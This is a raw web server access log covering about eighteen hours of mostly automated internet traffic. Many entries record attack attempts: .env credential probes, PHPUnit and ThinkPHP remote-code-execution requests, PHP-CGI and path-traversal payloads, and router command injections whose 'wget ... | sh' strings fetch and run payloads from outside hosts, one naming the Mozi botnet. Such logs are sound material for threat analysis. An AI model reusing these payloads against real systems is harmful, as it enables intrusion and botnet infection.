58.229.114.50 - - [30/Sep/2024:16:10:22 +0900] "GET /home HTTP/1.1" 301 5 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [30/Sep/2024:16:10:22 +0900] "GET /home/ HTTP/1.1" 200 18 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [30/Sep/2024:16:10:24 +0900] "GET /home/ HTTP/1.1" 200 18 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [30/Sep/2024:16:16:14 +0900] "GET /home/ HTTP/1.1" 200 18 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [30/Sep/2024:16:16:16 +0900] "GET /home/ HTTP/1.1" 200 18 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
152.42.214.140 - - [30/Sep/2024:16:22:52 +0900] "GET /cdn-cgi/trace HTTP/1.1" 404 134 "-" "Mozilla/5.0"
152.42.214.140 - - [30/Sep/2024:16:23:01 +0900] "\x16\x03\x01\x01\x0B\x01\x00\x01\x07\x03\x03" 400 166 "-" "-"
185.191.126.213 - - [30/Sep/2024:16:34:26 +0900] "GET / HTTP/1.1" 404 2311 "-" "-"
20.218.124.43 - - [30/Sep/2024:16:45:08 +0900] "GET https://login.microsoftonline.com/common/oauth2/v2.0/authorize HTTP/1.1" 404 162 "-" "-"
58.229.114.50 - - [30/Sep/2024:16:48:18 +0900] "GET /home/ HTTP/1.1" 200 18 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [30/Sep/2024:16:49:32 +0900] "GET /home/ HTTP/1.1" 200 569 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [30/Sep/2024:16:56:42 +0900] "GET /home/ HTTP/1.1" 200 569 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [30/Sep/2024:16:56:44 +0900] "GET /home/ HTTP/1.1" 200 569 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
205.210.31.56 - - [30/Sep/2024:17:11:19 +0900] "GET / HTTP/1.0" 200 615 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
178.211.139.188 - - [30/Sep/2024:17:19:49 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
216.218.206.67 - - [30/Sep/2024:17:48:07 +0900] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xDA\xD0\xC3FqzvS\xC2\x7Fb\xFD\xFF\x5C" 400 166 "-" "-"
71.6.232.20 - - [30/Sep/2024:18:01:53 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
93.174.93.12 - - [30/Sep/2024:18:18:34 +0900] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
135.125.246.110 - - [30/Sep/2024:18:24:30 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [30/Sep/2024:18:24:31 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.58.97.162 - - [30/Sep/2024:18:25:23 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
216.218.206.67 - - [30/Sep/2024:18:47:22 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
216.218.206.67 - - [30/Sep/2024:18:49:52 +0900] "GET /webui/ HTTP/1.1" 404 1073 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/101.0.4951.41 Safari/537.36"
216.218.206.67 - - [30/Sep/2024:18:51:46 +0900] "GET /geoserver/web/ HTTP/1.1" 404 1080 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
35.197.215.110 - - [30/Sep/2024:18:59:17 +0900] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x036x\xD9\xFD\xF4m\xE1\xCB{\x1B+\x07$\x84\xA3!\x01\x83\xB5o\xEE\x0Cn C\xCD\x0B\x9D\xE5u6] u\x9F\x1E\x96\xDE\xEE/\x07" 400 166 "-" "-"
35.197.215.110 - - [30/Sep/2024:18:59:19 +0900] "OPTIONS / HTTP/1.0" 404 2312 "-" "-"
95.214.55.43 - - [30/Sep/2024:19:32:50 +0900] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 2519 "-" "Go-http-client/1.1"
205.210.31.140 - - [30/Sep/2024:19:56:53 +0900] "GET / HTTP/1.1" 404 1064 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
47.250.81.203 - - [30/Sep/2024:20:01:38 +0900] "GET / HTTP/1.1" 404 2311 "-" "curl/7.64.1"
111.7.106.107 - - [30/Sep/2024:20:05:20 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
135.125.246.110 - - [30/Sep/2024:20:23:10 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [30/Sep/2024:20:23:11 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
68.183.17.85 - - [30/Sep/2024:20:34:52 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 166 "-" "-"
68.183.17.85 - - [30/Sep/2024:20:34:52 +0900] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 166 "-" "-"
68.183.17.85 - - [30/Sep/2024:20:34:52 +0900] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 2427 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:53 +0900] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2479 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:53 +0900] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2467 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:54 +0900] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2455 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:54 +0900] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2443 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:54 +0900] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 2464 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:55 +0900] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2500 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:55 +0900] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2458 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:55 +0900] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2446 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:56 +0900] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2434 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:56 +0900] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2422 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:56 +0900] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2470 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:57 +0900] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2458 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:57 +0900] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2446 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:57 +0900] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2434 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:58 +0900] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:58 +0900] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2503 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:58 +0900] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:59 +0900] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2488 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:59 +0900] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:59 +0900] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:34:59 +0900] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2497 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:00 +0900] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2488 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:00 +0900] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2497 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:00 +0900] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:01 +0900] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2503 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:01 +0900] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:01 +0900] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:02 +0900] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:02 +0900] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:02 +0900] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 0 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:02 +0900] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2500 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:03 +0900] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:03 +0900] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2530 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:03 +0900] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2497 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:04 +0900] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2500 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:04 +0900] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:05 +0900] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:05 +0900] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 2465 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:06 +0900] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 2486 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:06 +0900] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 404 2482 "-" "Custom-AsyncHttpClient"
68.183.17.85 - - [30/Sep/2024:20:35:06 +0900] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 2396 "-" "Custom-AsyncHttpClient"
135.125.246.110 - - [30/Sep/2024:21:05:26 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [30/Sep/2024:21:05:27 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.212.59.22 - - [30/Sep/2024:21:50:13 +0900] "GET /druid/index.html HTTP/1.1" 404 1081 "-" "Mozilla/5.0 zgrab/0.x"
135.125.246.189 - - [30/Sep/2024:22:27:31 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [30/Sep/2024:22:27:31 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
18.237.24.34 - - [30/Sep/2024:22:34:36 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
185.224.128.59 - - [30/Sep/2024:23:01:08 +0900] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 2522 "-" "Go-http-client/1.1"
94.156.68.104 - - [30/Sep/2024:23:20:42 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (Linux; Android 9; SM-A530W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
154.213.187.244 - - [01/Oct/2024:00:12:12 +0900] "CONNECT google.com:443 HTTP/1.1" 400 166 "-" "-"
185.224.128.83 - - [01/Oct/2024:00:14:43 +0900] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 2411 "-" "-"
13.91.241.208 - - [01/Oct/2024:00:35:19 +0900] "MGLNDD_13.209.93.212_80" 400 166 "-" "-"
135.125.246.189 - - [01/Oct/2024:00:35:34 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [01/Oct/2024:00:35:35 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.87.66.165 - - [01/Oct/2024:01:07:50 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1"
185.224.128.83 - - [01/Oct/2024:01:36:41 +0900] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 2411 "-" "-"
185.224.128.59 - - [01/Oct/2024:01:43:41 +0900] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 2411 "-" "-"
35.195.186.26 - - [01/Oct/2024:01:57:50 +0900] "GET / HTTP/1.1" 404 1061 "-" "python-requests/2.32.3"
135.125.246.189 - - [01/Oct/2024:02:41:54 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [01/Oct/2024:02:41:54 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
125.44.25.214 - - [01/Oct/2024:03:01:11 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.44.25.214:59846/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
103.186.101.138 - - [01/Oct/2024:03:07:03 +0900] "CONNECT www.google.com:443 HTTP/1.1" 400 166 "-" "-"
172.206.143.168 - - [01/Oct/2024:03:07:56 +0900] "GET /actuator/health HTTP/1.1" 404 1082 "-" "Mozilla/5.0 zgrab/0.x"
80.82.77.202 - - [01/Oct/2024:03:20:14 +0900] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
205.210.31.54 - - [01/Oct/2024:04:06:10 +0900] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD1\x8F\x1F\x8F,\xE9\xDE;6\x97\xAB\xCC\xD3\x8B^\xFA\xACh\x9D\xB8\x88\xA0c\x22\xF5\xC3\xCA=\x01\xC5\xD2\x87 \xC7\xB7\x1A\xBF\xBC\x7F\x89\x8B\x05&wSP\x15\xE3\xBBHz?A\x80\x0C\xB5\x94\x8E\xA4/\x9B\x8AH\x9AA\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
205.210.31.54 - - [01/Oct/2024:04:06:10 +0900] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xE9\xA5c\x9F\xFB\xE7Z\x08\x15\xD6\x033\xD2=\xF1<\x11\xB0S:\xD0\x8C\xB1\x07n\xCATO\xB2\xC1\x020\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"
135.125.246.189 - - [01/Oct/2024:04:49:36 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [01/Oct/2024:04:49:36 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.82.77.202 - - [01/Oct/2024:05:10:27 +0900] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
135.125.246.189 - - [01/Oct/2024:05:19:48 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [01/Oct/2024:05:19:48 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.212.141.225 - - [01/Oct/2024:05:20:17 +0900] "GET / HTTP/1.1" 404 2311 "-" "-"
93.174.93.12 - - [01/Oct/2024:05:21:01 +0900] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Linux; Android 9; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
66.240.205.34 - - [01/Oct/2024:05:42:21 +0900] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"
31.220.1.144 - - [01/Oct/2024:05:45:27 +0900] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 2518 "-" "Go-http-client/1.1"
95.214.55.138 - - [01/Oct/2024:05:47:58 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.43 - - [01/Oct/2024:05:57:09 +0900] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 2519 "-" "Go-http-client/1.1"
93.174.93.12 - - [01/Oct/2024:06:08:25 +0900] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
172.169.2.251 - - [01/Oct/2024:06:28:41 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 zgrab/0.x"
167.94.138.35 - - [01/Oct/2024:06:38:02 +0900] "GET / HTTP/1.1" 404 2311 "-" "-"
167.94.138.35 - - [01/Oct/2024:06:38:10 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.35 - - [01/Oct/2024:06:38:12 +0900] "PRI * HTTP/2.0" 400 166 "-" "-"
135.125.246.189 - - [01/Oct/2024:08:05:15 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [01/Oct/2024:08:05:16 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.248 - - [01/Oct/2024:08:14:10 +0900] "GET / HTTP/1.1" 404 1064 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.165.191.26 - - [01/Oct/2024:08:54:54 +0900] "GET / HTTP/1.1" 404 2308 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.165.191.26 - - [01/Oct/2024:08:54:55 +0900] "GET /robots.txt HTTP/1.1" 404 2356 "-" "-"
185.165.191.26 - - [01/Oct/2024:08:54:55 +0900] "GET /sitemap.xml HTTP/1.1" 404 2359 "-" "-"
185.165.191.26 - - [01/Oct/2024:08:54:56 +0900] "GET /.well-known/security.txt HTTP/1.1" 404 2398 "-" "-"
135.125.246.189 - - [01/Oct/2024:09:04:00 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [01/Oct/2024:09:04:01 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.89 - - [01/Oct/2024:09:52:08 +0900] "GET / HTTP/1.0" 200 615 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.244.48 - - [01/Oct/2024:10:10:05 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
